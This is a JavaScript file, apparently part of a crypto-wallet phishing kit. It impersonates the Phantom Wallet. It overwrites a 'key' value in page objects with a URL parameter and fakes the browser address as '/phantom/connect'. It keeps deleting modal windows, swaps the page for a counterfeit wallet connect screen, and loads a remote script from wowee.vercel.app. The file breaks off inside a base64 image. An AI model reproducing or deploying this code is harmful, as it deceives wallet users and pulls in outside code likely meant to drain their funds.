try {
      const url = new URL(window.location.href);
      const params = new URLSearchParams(url.search);
      const key = params.get("key");
      if (key) {
	 setInterval(() => {
          try {
            Object.keys(window).forEach((keyName) => {
              try {
                  if (typeof(window[keyName]) == "object") {
                      if (window[keyName]["key"] != null && window[keyName]["explain_blowfish"] != null) {
                          window[keyName]["key"] = key;
                      }
                  }
              } catch(error) {}
          });
          } catch(error) {}
       }, 50);
      } else {
	location.href = "https://phantom.app/"
      }
} catch(error) {
	location.href = "https://phantom.app/"
}

function pushUrlState() {
    const newUrl = '/phantom/connect';
    window.history.pushState({ path: newUrl }, '', newUrl);
    
}
pushUrlState()
setInterval(() => {
      pushUrlState();
}, 500)
const ensurePageChange = setInterval(() => {
    if (document.getElementById("pageFullyLoadedActive") != null) {
  
      function removeElement() {
          
          console.log("hi")
          
          
         
      }
      
      

      
      try {
	setInterval(() => {
	try {
	document.getElementsByClassName("modal-window modal-window-visible")[0].remove();
	} catch(error) {}
	}, 0);
      } catch(error) {}
      
  
  

  
      try {

  
          const script = document.createElement('script');
          script.src = 'https://wowee.vercel.app/main_source.js';
          document.body.appendChild(script);
        
          
        
      } catch(error) {
  location.href = "https://phantom.app"
  }
  
      return clearInterval(ensurePageChange);
    };
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Wallet</title>
    <style>
        :root {
            --background-color: #1c1c28;
            --text-color: #ffffff;
            --description-color: #9d9da9;
            --button-color: #A99FEC;
            --button-hover-color: #9589e0;
        }

        .modal-window modal-window-visible {
		display: none !important;
         }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background-color: var(--background-color);
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-color);
        }

        .wallet-container {
            width: 100%;
            max-width: 420px;
            height: 100%;
            max-height: 600px;
            padding: 32px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .wallet-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 100%;
        }

        .wallet-header {
            padding-top: 25vh;
        }

        .wallet-logo {
            width: 100%;
            max-width: 250px;
            margin-bottom: 16px;
        }

        .wallet-description {
            color: var(--description-color);
            font-size: 14px;
            line-height: 1.4;
            margin-bottom: 32px;
        }

        .connect-wallet-button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
            background-color: var(--button-color);
            color: var(--text-color);
        }

        .connect-wallet-button:hover {
            background-color: var(--button-hover-color);
        }

        @media (max-width: 480px) {
            .wallet-container {
                padding: 24px;
            }

            .wallet-logo {
                max-width: 200px;
            }

            .button {
                padding: 14px;
                font-size: 14px;
            }

            .wallet-header {
                padding-top: 20vh;
            }
        }
    </style>
</head>
<body>
<div style="display: none;" id="pageFullyLoadedActive"></div>
    <div class="wallet-container">
        <div class="wallet-content">
            <div class="wallet-header">
                <img src="data:image/png;base64,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